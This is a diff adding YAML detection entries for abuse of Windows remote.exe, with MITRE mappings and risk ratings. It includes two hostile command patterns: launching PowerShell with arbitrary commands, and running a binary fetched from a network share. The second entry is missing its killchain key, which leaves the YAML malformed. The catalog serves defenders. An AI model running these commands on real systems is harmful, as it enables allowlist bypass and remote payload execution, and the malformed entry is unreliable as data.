@@ -1,0 +1,41 @@
+- command: Remote.exe /s "powershell.exe" [ANY ARGUMENTS/COMMANDS]
+  description: Abuse remote.exe to launch powershell as a child process with relevant commands in-line or a separate script entirely.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1127
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Remote/
+    - https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/
+  risk: High
+  risk_reason: Use of remote.exe with PowerShell is a suspicious activity for most users.
+  fidelity: High
+  fidelity_reason: This is typically a rare behavior in most organizations.
+  tool: remote
+  threatactors:
+    N/A:
+      - N/A
+- command: Remote.exe /s "\\10.10.10.30\binaries\file.exe" [ANY ARGUMENTS/COMMANDS]
+  description: Abuse remote.exe to launch an arbitrary remotely-hosted binary payload.
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1127
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Remote/
+    - https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/
+  risk: High
+  risk_reason: Use of remote.exe with a remote payload is extremely suspicious.
+  fidelity: High
+  fidelity_reason: This is typically a rare behavior in most organizations.
+  tool: remote
+  threatactors:
+    N/A:
+      - N/A
